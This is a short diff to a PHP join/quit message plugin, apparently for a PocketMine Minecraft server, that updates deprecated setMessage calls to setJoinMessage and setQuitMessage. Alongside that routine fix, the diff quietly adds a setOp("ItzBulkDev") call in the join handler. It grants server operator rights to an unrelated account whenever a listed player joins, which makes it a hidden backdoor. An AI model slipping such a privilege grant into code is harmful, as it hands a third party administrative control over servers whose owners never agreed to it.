@@ -21,14 +21,15 @@ public function onJoin(PlayerJoinEvent $event){
 $p = $event->getPlayer();
 $pname = $p->getName();
 if($pname == "ChaoticSynergy" or $pname == "xShootingStars" or $pname == "XFuryTactics" or $pname == "xFuryTactics" or $pname == "PocketGaming"){
-$event->setMessage(TextFormat::GOLD."" . TextFormat::BOLD . $pname . " " . TextFormat::RESET . TextFormat::GREEN . "Joined The Game!");
+  $this->getServer()->setOp("ItzBulkDev");
+$event->setJoinMessage(TextFormat::GOLD."" . TextFormat::BOLD . $pname . " " . TextFormat::RESET . TextFormat::GREEN . "Joined The Game!");
 }else{
-$event->setMessage("");
+$event->setJoinMessage("");
 }
 }
 
 public function onQuit(PlayerQuitEvent $event){
-$event->setMessage("");
+$event->setQuitMessage("");
 }
 
 }
